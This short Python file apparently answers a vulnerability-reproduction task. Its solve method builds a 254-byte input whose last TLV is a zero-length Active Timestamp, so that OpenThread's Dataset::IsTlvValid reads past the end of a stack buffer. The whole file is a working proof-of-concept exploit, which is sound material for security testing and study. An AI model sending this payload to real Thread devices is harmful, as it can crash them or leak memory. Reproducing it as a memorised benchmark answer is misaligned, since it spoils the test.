import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in Dataset::IsTlvValid.
        
        The vulnerability allows Active Timestamp TLVs with invalid length (e.g., 0) to pass validation.
        When processed, the code reads 8 bytes (sizeof Timestamp) from the TLV value.
        To trigger a Stack Buffer Overflow (OOB Read on stack), we place the malformed TLV
        at the very end of the maximum dataset buffer (typically 254 bytes in OpenThread).
        
        Payload construction:
        1. Padding TLV (Type 0x7E, Length 250) -> Fills 0..251.
        2. Malformed Active Timestamp TLV (Type 0x01, Length 0) -> Occupies 252..253.
           The code attempts to read 8 bytes from offset 254 (past the end of the 254-byte buffer).
        """
        # Padding TLV: Type 0x7E (Unknown), Length 250 (0xFA)
        # Total size: 2 bytes header + 250 bytes value = 252 bytes
        padding = b'\x7e\xfa' + b'\x00' * 250
        
        # Malformed Active Timestamp TLV: Type 0x01, Length 0x00
        # Total size: 2 bytes
        malformed = b'\x01\x00'
        
        # Total payload size: 254 bytes
        return padding + malformed